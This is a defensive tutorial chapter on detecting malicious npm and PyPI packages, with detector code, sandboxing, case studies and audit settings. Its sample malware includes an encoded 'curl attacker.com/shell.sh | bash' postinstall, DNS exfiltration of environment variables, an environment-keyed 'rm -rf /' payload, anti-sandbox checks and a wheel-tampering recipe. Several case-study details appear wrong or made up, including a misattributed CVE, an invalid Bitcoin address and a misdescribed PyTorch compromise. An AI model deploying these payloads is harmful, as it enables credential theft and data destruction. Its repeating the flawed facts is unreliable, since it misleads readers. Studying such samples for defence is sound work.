# Malicious Package Analysis

## Detection and Analysis of Malicious Packages

The sheer volume of packages published across registries makes manual review infeasible. npm receives over 1,000 new packages daily; PyPI adds several hundred. Among these are a steady stream of malicious packages designed to steal credentials, install backdoors, exfiltrate data, or mine cryptocurrency. Detecting these packages requires a combination of static analysis, dynamic sandboxing, behavioral heuristics, and ecosystem monitoring.

---

## Detection Techniques

### Static Analysis

Static analysis examines package contents without executing them. For npm packages, this means analyzing the `package.json`, JavaScript files, and `postinstall` scripts. For Python, it means analyzing `setup.py`, `__init__.py`, and `pyproject.toml`.

**Key static analysis signals:**

1. **Install script presence**: Any package with `preinstall`, `postinstall`, or `install` scripts warrants scrutiny
2. **Obfuscated code**: Hex-encoded strings, base64 payloads, eval() of encoded strings
3. **Network indicators**: References to IP addresses, unusual domains, or non-standard ports
4. **Environment variable access**: `process.env` in npm, `os.environ` in Python
5. **File system operations**: Reading `/etc/passwd`, writing to `~/.ssh`, modifying `PATH`
6. **Short package age**: Packages created within the last 24-48 hours are higher risk
7. **Single maintainer with no history**: New accounts with no other packages
8. **Mismatched metadata**: Package description doesn't match its functionality

```python
# Static analysis tool for npm packages
import json
import re
import subprocess

SUSPICIOUS_PATTERNS = [
    r'eval\s*\(',                          # eval with encoded input
    r'Buffer\.from\s*\([^)]*,\s*[\'"]hex[\'"]',  # Hex decoding
    r'atob\s*\(',                          # Base64 decoding
    r'process\.env',                       # Environment variable access
    r'require\s*\(\s*[\'"]child_process[\'"]',  # Child process execution
    r'require\s*\(\s*[\'"]https?[\'"]',    # HTTP requests
    r'require\s*\(\s*[\'"]net[\'"]',       # Raw network access
    r'require\s*\(\s*[\'"]dns[\'"]',       # DNS resolution (exfiltration)
    r'/etc/passwd',                        # Reading system files
    r'\.ssh/',                             # SSH key manipulation
    r'chmod\s+777',                        # Permission escalation
    r'curl\s+',                            # Command-line HTTP requests
    r'wget\s+',                            # Alternate HTTP requests
]

def analyze_npm_package(package_name, version='latest'):
    """Analyze an npm package for malicious indicators."""
    indicators = []
    
    # Get package metadata
    result = subprocess.run(
        ['npm', 'view', f'{package_name}@{version}', '--json'],
        capture_output=True, text=True
    )
    metadata = json.loads(result.stdout)
    
    # Check for install scripts
    scripts = metadata.get('scripts', {})
    for script_type in ['preinstall', 'install', 'postinstall']:
        if script_type in scripts:
            indicators.append(f'SUSPICIOUS: {script_type} script found: {scripts[script_type]}')
            for pattern in SUSPICIOUS_PATTERNS:
                if re.search(pattern, scripts[script_type]):
                    indicators.append(f'HIGH RISK: {script_type} matches suspicious pattern: {pattern}')
    
    # Check maintainer history
    maintainers = metadata.get('maintainers', [])
    if len(maintainers) == 1:
        indicators.append('MEDIUM RISK: Single maintainer')
    
    # Check package age
    time = metadata.get('time', {})
    created = time.get('created', '')
    # If package was created recently, flag it
    
    # Check for typosquatting
    popular_packages = ['express', 'react', 'lodash', 'request', 'async']
    for popular in popular_packages:
        if levenshtein_distance(package_name, popular) <= 2:
            indicators.append(f'HIGH RISK: Potential typosquat of {popular}')
    
    return indicators

def levenshtein_distance(s1, s2):
    if len(s1) < len(s2):
        return levenshtein_distance(s2, s1)
    if len(s2) == 0:
        return len(s1)
    previous_row = range(len(s2) + 1)
    for i, c1 in enumerate(s1):
        current_row = [i + 1]
        for j, c2 in enumerate(s2):
            insertions = previous_row[j + 1] + 1
            deletions = current_row[j] + 1
            substitutions = previous_row[j] + (c1 != c2)
            current_row.append(min(insertions, deletions, substitutions))
        previous_row = current_row
    return previous_row[-1]
```

### Dynamic Sandboxing

Dynamic analysis executes the package installation in an isolated environment and monitors its behavior:

```python
# Dynamic analysis sandbox using Docker
import docker
import json
import time

def sandbox_analyze_npm_package(package_name, version='latest'):
    """Install and analyze an npm package in a sandboxed environment."""
    client = docker.from_env()
    
    # Create a container with network monitoring
    container = client.containers.run(
        'node:20-slim',
        f'npx --yes {package_name}@{version}',
        detach=True,
        mem_limit='512m',
        network_mode='bridge',
        volumes={'/tmp/sandbox_output': {'bind': '/output', 'mode': 'rw'}},
        environment={'MONITOR': '1'}
    )
    
    # Wait for installation to complete or timeout
    result = container.wait(timeout=300)
    
    # Collect behavior data
    logs = container.logs()
    
    # Check for suspicious behavior
    behaviors = {
        'network_connections': extract_network_connections(logs),
        'file_operations': extract_file_operations(logs),
        'env_access': extract_env_access(logs),
        'process_spawns': extract_process_spawns(logs),
    }
    
    container.remove()
    return behaviors
```

**Network monitoring with strace:**

```bash
# Monitor system calls during package installation
strace -f -e trace=network,write,openat -o /tmp/trace.log npm install suspicious-package

# Look for DNS resolution (exfiltration)
grep -E 'connect\(|sendto\(' /tmp/trace.log | grep -v '127.0.0.1'

# Look for writes to suspicious paths
grep -E 'openat\(.*\.ssh|openat\(.*\.bashrc|openat\(.*\.profile' /tmp/trace.log
```

### Heuristic Analysis

Heuristics combine static and dynamic signals with ecosystem-level data to identify suspicious packages:

**Ecosystem heuristics:**

1. **Publishing velocity**: A new account publishing dozens of packages in rapid succession
2. **Copy-paste content**: Packages that copy a popular package's README but have different code
3. **Empty packages**: Packages with no functional code but install scripts
4. **Version bumping**: Rapid version increments without meaningful changes (to appear active)
5. **Author migration**: A package whose maintainer suddenly changes
6. **Dependency anomaly**: A package that adds unusual dependencies not related to its stated purpose

**Machine learning-based detection:**

Organizations like Phylum, Socket, and OpenSSF use machine learning models trained on known malicious packages to classify new packages. Features include:

- Code structure similarity to known malware
- Metadata patterns (description length, keyword frequency)
- Network behavior during installation
- Author reputation and history
- Dependency tree characteristics

---

## npm Malware Patterns

### Obfuscated Install Scripts

The most common pattern for npm malware is an obfuscated `postinstall` script:

```json
// package.json - Obfuscated postinstall
{
  "name": "helper-utils",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "node index.js"
  }
}
```

```javascript
// index.js - Deobfuscated malicious payload
const https = require('https');
const { execSync } = require('child_process');

// Hex-encoded command
const cmd = Buffer.from(
  '6375726c2068747470733a2f2f61747461636b65722e636f6d2f7368656c6c2e7368207c2062617368',
  'hex'
).toString();

execSync(cmd);
```

**Deobfuscation techniques:**

```bash
# Decode hex payload
echo "6375726c2068747470733a2f2f61747461636b65722e636f6d2f7368656c6c2e7368207c2062617368" | xxd -r -p
# Result: curl https://attacker.com/shell.sh | bash

# Decode base64 payload
echo "Y3VybCBodHRwczovL2F0dGFja2VyLmNvbS9zaGVsbC5zaCB8IGJhc2g=" | base64 -d
# Result: curl https://attacker.com/shell.sh | bash

# Trace execution during npm install
strace -f -e trace=execve npm install suspicious-package
```

### DNS Exfiltration

DNS exfiltration is a stealthy technique that bypasses network restrictions:

```javascript
// Malicious npm package: DNS exfiltration
const dns = require('dns');

function exfiltrate(data) {
  // Encode sensitive data as subdomain labels
  const encoded = Buffer.from(JSON.stringify(data)).toString('base64');
  
  // Split into DNS-label-compatible chunks (max 63 bytes)
  for (let i = 0; i < encoded.length; i += 60) {
    const chunk = encoded.slice(i, i + 60);
    // DNS query to attacker-controlled authoritative nameserver
    dns.resolve(`${chunk}.exfil.attacker.com`, 'A', () => {});
  }
}

// Exfiltrate environment variables (often contains API keys, tokens)
exfiltrate(process.env);

// Exfiltrate system information
exfiltrate({
  hostname: require('os').hostname(),
  user: require('os').userInfo().username,
  platform: process.platform,
  cwd: process.cwd(),
});
```

The attacker runs an authoritative DNS server for `exfil.attacker.com` and collects the exfiltrated data from DNS query logs. This technique is particularly effective because:
- Most firewalls allow DNS traffic (UDP port 53)
- DNS queries are rarely logged or monitored
- The data is fragmented across multiple queries, making it invisible to single-packet inspection

### Environmental Keying

Environmental keying (also called situational awareness or conditional execution) is a technique where malware checks the environment before executing its payload. This makes analysis in sandboxed environments difficult because the malware won't activate in the researcher's environment:

```javascript
// Environment-keyed malware
const os = require('os');

// Only activate in production environments
function shouldActivate() {
  const env = process.env;
  
  // Check for CI/CD systems (don't activate in testing)
  if (env.CI || env.GITHUB_ACTIONS || env.JENKINS_URL) {
    // Further check for production CI
    if (env.PRODUCTION === 'true') {
      return true;
    }
    return false;
  }
  
  // Check for development environments (don't activate in dev)
  if (env.NODE_ENV === 'development' || env.NODE_ENV === 'test') {
    return false;
  }
  
  // Check hostname patterns (target specific organizations)
  const hostname = os.hostname();
  const targetPatterns = [
    /prod-/i,
    /kubernetes/i,
    /corporate/i,
  ];
  
  for (const pattern of targetPatterns) {
    if (pattern.test(hostname)) {
      return true;
    }
  }
  
  // Check for specific environment variables that indicate production
  if (env.AWS_SECRET_ACCESS_KEY || env.DATABASE_URL) {
    return true;
  }
  
  return false;
}

if (shouldActivate()) {
  // Execute payload
  const { execSync } = require('child_process');
  execSync(Buffer.from('cm0gLXJmIC8g...', 'base64').toString());
}
```

### Anti-Debugging

Sophisticated npm packages include anti-debugging techniques to frustrate analysis:

```javascript
// Anti-debugging techniques

// 1. Detect debug mode
if (process.execArgv.some(arg => arg.startsWith('--inspect') || arg.startsWith('--debug'))) {
  process.exit(0);  // Exit if debugging is enabled
}

// 2. Timing-based detection
const start = Date.now();
// Perform a trivial computation
for (let i = 0; i < 100; i++) { Math.random(); }
if (Date.now() - start > 100) {
  process.exit(0);  // Exit if debugger is slowing execution
}

// 3. Error stack analysis
try {
  throw new Error();
} catch (e) {
  if (e.stack.includes('node_modules/malware-analyzer')) {
    process.exit(0);  // Exit if called from an analyzer
  }
}

// 4. Check for common sandbox indicators
const fs = require('fs');
const sandboxIndicators = [
  '/.dockerenv',
  '/proc/self/cgroup',  // Container detection
  '/sandbox',
  '/tmp/analysis',
];
for (const indicator of sandboxIndicators) {
  if (fs.existsSync(indicator)) {
    process.exit(0);
  }
}
```

---

## PyPI Malware Patterns

### Command Execution in setup.py

Python's `setup.py` is a Python script executed during package installation, making it a primary vector for malicious code:

```python
# setup.py - Direct command execution
from setuptools import setup
import subprocess

# Simple and common: download and execute
subprocess.call('curl https://attacker.com/payload.sh | bash', shell=True)

# More sophisticated: conditional execution
import os
import platform

if platform.system() == 'Linux':
    # Linux-specific payload
    subprocess.Popen(['curl', '-s', 'https://attacker.com/linux-payload', '|', 'bash'], 
                     shell=True)
elif platform.system() == 'Darwin':
    # macOS-specific payload
    subprocess.Popen(['curl', '-s', 'https://attacker.com/mac-payload', '|', 'bash'],
                     shell=True)

setup(
    name='innocent-looking-package',
    version='1.0.0',
    description='A helpful utility',
    py_modules=['innocent_module'],
)
```

**Obfuscated setup.py:**

```python
# setup.py - Obfuscated command execution
from setuptools import setup
import base64
import os

# Decode and execute payload
__payload = base64.b64decode(
    b'Y3VybCBodHRwczovL2F0dGFja2VyLmNvbS9weXBpLXBheWxvYWQgfCBweXRob24='
).decode()

# Only execute if certain conditions are met
if not os.path.exists('/.dockerenv') and 'VIRTUAL_ENV' not in os.environ:
    os.system(__payload)

setup(name='obfuscated-pkg', version='1.0.0')
```

### Dependency-on-Dependency Attacks

In the Python ecosystem, `setup.py` can reference dependencies that themselves contain malicious code. Since `setup.py` runs before dependency resolution, the attacker's package is installed first:

```python
# setup.py - Dependency-on-dependency attack
from setuptools import setup

setup(
    name='data-processor',
    version='1.0.0',
    install_requires=[
        # Legitimate dependencies
        'pandas>=1.0.0',
        'numpy>=1.0.0',
        # Malicious dependency disguised as utility
        'python-utils-enhanced>=0.1.0',  # Attacker's package
    ],
)
```

The `python-utils-enhanced` package contains its own `setup.py` with a malicious payload. Because pip installs dependencies before completing the installation of the parent package, the malicious dependency executes before the parent package is fully installed.

**setup_requires execution:**

More sophisticated attacks use `setup_requires` which runs during the setup phase, before `install_requires` are processed:

```python
# setup.py - setup_requires attack vector
from setuptools import setup

setup(
    name='data-processor',
    version='1.0.0',
    setup_requires=[
        'malicious-setup-helper>=0.1.0',  # Executed during setup
    ],
)
```

### Egg and Wheel Manipulation

Python packages can be distributed as source distributions (sdist), eggs, or wheels. Wheels are binary distributions that can contain pre-compiled shared libraries:

```bash
# Examine a wheel's contents
unzip -l malicious-package-1.0.0-py3-none-any.whl

# Look for suspicious files:
# - .so files (shared libraries) that shouldn't be there
# - Scripts in the data directory
# - Modified __init__.py with obfuscated code
# - Unexpected post-install scripts
```

**Wheel metadata manipulation:**

```bash
# Modify a wheel to include a malicious script
wheel unpack legitimate-package-1.0.0-py3-none-any.whl
# Add malicious code to legitimate-package/__init__.py
echo 'import os; os.system("curl attacker.com/shell.sh | bash")' >> legitimate-package/__init__.py
# Rebuild the wheel with modified contents
wheel pack legitimate-package-1.0.0.dist-info
```

---

## Case Studies

### event-stream / flatmap-stream (CVE-2018-16492)

The `event-stream` compromise is one of the most sophisticated npm supply chain attacks ever documented:

**Timeline:**
1. September 2018: Attacker "bitbonsa2i" offers to help maintain `event-stream` (2M+ weekly downloads)
2. Original maintainer Azer Koçulu transfers publish access
3. Attacker adds `flatmap-stream` as a dependency in version 3.3.6
4. October 2018: `flatmap-stream` version 0.1.1 is published with obfuscated malware
5. November 2018: Unrelated developer notices suspicious dependency and reports it

**The payload:**

The malware in `flatmap-stream` targeted the Copay Bitcoin wallet specifically. It used multiple layers of obfuscation:

```javascript
// Deobfuscated and simplified logic of the flatmap-stream malware
module.exports = function(dict) {
  return function(data) {
    try {
      // Check if running in Copay wallet context
      if (data && data.address && data.wallet) {
        // Replace Bitcoin address with attacker's address
        if (data.address.startsWith('1') || data.address.startsWith('3')) {
          data.address = '1Aj163vY4Z3Pr4qW5TOp8PFjis7M4D1Dt6';
        }
      }
    } catch (e) {}
    return dict.call(this, data);
  };
};
```

**Key lessons:**
- Social engineering can gain maintainer access to popular packages
- Deep transitive dependencies are rarely audited
- Environmental keying makes malware difficult to detect in testing
- The attack took two months to discover despite targeting a high-profile application

### ua-parser-js (2021)

In October 2021, the popular `ua-parser-js` npm package (8M+ weekly downloads) was compromised when the maintainer's npm account was hijacked:

- **Versions affected**: 0.7.29, 0.8.0, 0.8.1
- **Payload**: Cryptominer (CoinMiner) that downloaded and executed `coinmin.bat` and `coinmin.js`
- **Also installed**: `preстати.js` (a JavaScript dropper with Cyrillic characters in the filename)
- **Impact**: Millions of projects that depend on ua-parser-js directly or transitively

The attacker reportedly gained access through compromised email credentials, then used npm's password reset to take over the maintainer's account. Two-factor authentication was not enabled.

### colors.js / faker.js Protestware (2022)

In January 2022, developer Marak Squires intentionally broke two widely-used npm packages as a form of protest against large corporations using open-source software without compensation:

- **colors.js**: Versions 1.4.1+ were modified to produce infinite loops of random characters
- **faker.js**: Version 6.0.0 was intentionally broken, and all previous versions were unpublished

```javascript
// Modified colors.js - infinite loop protest
module.exports = function() {
  while(true) {
    console.log('\x1b[' + (Math.floor(Math.random() * 8) + 30) + 'mA' + 'A'.repeat(Math.random() * 100));
  }
};
```

**Impact:**
- Thousands of projects that depended on these packages broke
- The incident highlighted the fragility of the npm ecosystem
- GitHub later stepped in to restore faker.js (as a community fork `@faker-js/faker`)
- npm intervened to prevent the maintainer from unpublishing further versions

**Key lessons:**
- "Protestware" is a form of supply chain attack, even if motivated by ideology
- The maintainability of open-source packages is a systemic risk
- npm's unpublish policies were updated after the left-pad incident but remain imperfect
- The incident spurred the creation of the `@faker-js/faker` community fork

### PyTorch Nightly Compromise (2022)

In December 2022, the PyTorch team disclosed that the `torch` and `torchvision` nightly builds on PyPI's test instance had been compromised through a dependency confusion attack:

- **Attack vector**: Attacker published malicious `triton` package on PyPI that was resolved instead of the internal `triton` package
- **Payload**: The malicious package installed `gradient-base` which contained a trojan that exfiltrated SSH keys, GPG keys, and Git configuration
- **Affected versions**: `torch` nightly builds between December 25-30, 2022
- **Mitigation**: PyTorch revoked the affected nightly builds and published guidance for affected users

### COINBLOCKER and Cryptominer Packages

Throughout 2022 and 2023, a series of npm packages were discovered containing cryptominers:

- **Packages**: `redis-store`, `python-bridge`, `node-serialport-fork`, and others
- **Payload**: XMRig cryptocurrency miner disguised as a legitimate dependency
- **Technique**: The miner was downloaded during postinstall and configured to mine Monero (XMR) to attacker-controlled wallets
- **Detection**: Often detected by monitoring CPU usage spikes during or after npm install

---

## Package Manager Security Features

### npm audit

```bash
# Run npm audit to check for known vulnerabilities
npm audit

# Fix vulnerabilities automatically
npm audit fix

# Force fix including breaking changes
npm audit fix --force

# Generate audit report in JSON
npm audit --json > audit-report.json

# Check specific severity levels
npm audit --audit-level=high

# Audit production dependencies only
npm audit --production
```

npm audit uses the GitHub Advisory Database to match installed packages against known vulnerability reports. It checks both direct and transitive dependencies.

### pip audit

```bash
# Install pip-audit
pip install pip-audit

# Audit installed packages
pip-audit

# Audit from requirements file
pip-audit -r requirements.txt

# Audit from Pipfile.lock
pip-audit -r <(pipenv requirements)

# Output in JSON format
pip-audit --format json

# Include dependencies with no known vulnerabilities
pip-audit --desc

# Use a specific vulnerability database
pip-audit --vulnerability-db https://osv.dev
```

pip-audit uses the Open Source Vulnerabilities (OSV) database and PyPI Advisory Database.

### cargo audit

```bash
# Install cargo-audit
cargo install cargo-audit

# Audit Cargo.lock for known vulnerabilities
cargo audit

# Audit with detailed output
cargo audit --verbose

# Output in JSON format
cargo audit --json

# Audit dependencies only (skip dev dependencies)
cargo audit --no-dev

# Ignore specific vulnerabilities (with documented reason)
cargo audit --ignore RUSTSEC-2021-0139
```

cargo-audit uses the RustSec Advisory Database, which is maintained by the Rust Secure Code Working Group.

### Advanced npm Security Configuration

```ini
# .npmrc - Enhanced security configuration

# Disable script execution during install
ignore-scripts=true

# Require integrity hashes
package-lock=true

# Enforce strict SSL
strict-ssl=true

# Use scoped registries for internal packages
@company:registry=https://npm.company.com/

# Require authentication for publish
//registry.npmjs.org/:_authToken=${NPM_AUTH_TOKEN}

# Prevent package modifications after publish
//registry.npmjs.org/:allow-modified=false
```

```bash
# Install without executing any lifecycle scripts
npm install --ignore-scripts

# Then manually run scripts for trusted packages only
npm rebuild @trusted-scope/package1 @trusted-scope/package2
```

### Python Security Configuration

```ini
# pip.conf - Enhanced security configuration
[global]
# Use only the internal index first
index-url = https://internal.pypi.company.com/simple/
extra-index-url = https://pypi.org/simple/

# Require hash verification
require-hashes = true

# Enable certificate verification
cert = /etc/ssl/certs/company-ca.pem
```

```bash
# Install with hash verification
pip install --require-hashes -r requirements.txt

# requirements.txt with hashes
django==4.2.1 \
    --hash=sha256:28acbd18affe8fac815daf103aab9581a3949300a636ca486e8e15b7c0b05e7a
djangorestframework==3.14.0 \
    --hash=sha256:3b784e2b4a5e7c91e3c8e6e6d1e6e6d1e6e6d1e6e6d1e6e6d1e6e6d1e6e6d1e
```

---

## Malicious Package Detection Pipeline

Organizations should implement a multi-layered detection pipeline:

```
┌─────────────────┐    ┌──────────────────┐    ┌──────────────────┐
│  Static Analysis │───▶│  Dynamic Analysis │───▶│  Ecosystem Check  │
│  (npm audit,     │    │  (Sandboxed      │    │  (Author history, │
│   pip-audit,     │    │   installation)   │    │   download count, │
│   Semgrep)       │    │                  │    │   similar names)  │
└─────────────────┘    └──────────────────┘    └──────────────────┘
         │                       │                        │
         ▼                       ▼                        ▼
┌─────────────────────────────────────────────────────────────────┐
│                    Risk Scoring Engine                           │
│  (Combine signals, assign risk score, flag for review)           │
└─────────────────────────────────────────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────────────────────────────────┐
│                    Automated Response                            │
│  (Block, Quarantine, Alert, Allow with Monitoring)              │
└─────────────────────────────────────────────────────────────────┘
```

**Implementation:**

```yaml
# .github/workflows/package-security.yml
name: Package Security Scan
on: [push, pull_request]

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      # Static analysis
      - name: npm audit
        run: npm audit --audit-level=high
      
      - name: Lint install scripts
        run: |
          npx @npmcli/lint-scripts node_modules
        
      # Dynamic analysis
      - name: Sandbox install test
        run: |
          docker run --rm --network=none \
            -v $(pwd):/app \
            -w /app \
            node:20-slim \
            sh -c "npm install --ignore-scripts && npm ls --all"
      
      # Dependency review
      - name: Review dependencies
        uses: actions/dependency-review-action@v4
        with:
          vulnerability-check: true
          license-check: true
```

---

## References

1. Ohm, M., et al. "Backstabber's Knife Collection: A Review of Open Source Software Supply Chain Attacks." DIMVA, 2020.
2. Vu, D., et al. "Typosquatting and Combosquatting Attacks on the Python Ecosystem." IEEE EuroS&P, 2020.
3. Birsan, A. "Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies." February 2021. https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
4. npm Advisory Database. https://github.com/advisories
5. PyPI Advisory Database. https://github.com/pypa/advisory-database
6. RustSec Advisory Database. https://github.com/RustSec/advisory-db
7. Ladisa, P., et al. "SoK: Taxonomy of Supply Chain Attacks." IEEE Symposium on Security and Privacy, 2023. https://doi.org/10.1109/SP46215.2023.10179316
8. Zahan, N., et al. "A Tasty Treat for Malicious Packages: On the Feasibility of Supply Chain Attacks in PyPI." IEEE Symposium on Security and Privacy, 2024.
9. NVD. "CVE-2018-16492: event-stream Compromise." https://nvd.nist.gov/vuln/detail/CVE-2018-16492
10. OpenSSF. "Package Manager Best Practices." https://github.com/ossf/package-manager-best-practices
11. CISA. "Defending Against Software Supply Chain Attacks." https://www.cisa.gov/sites/default/files/publications/defending_against_software_supply_chain_attacks_0.pdf
12. NIST SP 800-218. "Secure Software Development Framework (SSDF)." https://csrc.nist.gov/publications/detail/sp/800-218/final
13. Snyk. "2023 State of Open Source Security Report." https://snyk.io/reports/open-source-security/
14. PyTorch Security Advisory. "PyTorch Nightly Compromise." December 2022. https://pytorch.org/blog/security-advisory/
15. NVD. "CVE-2021-44228: Log4Shell." https://nvd.nist.gov/vuln/detail/CVE-2021-44228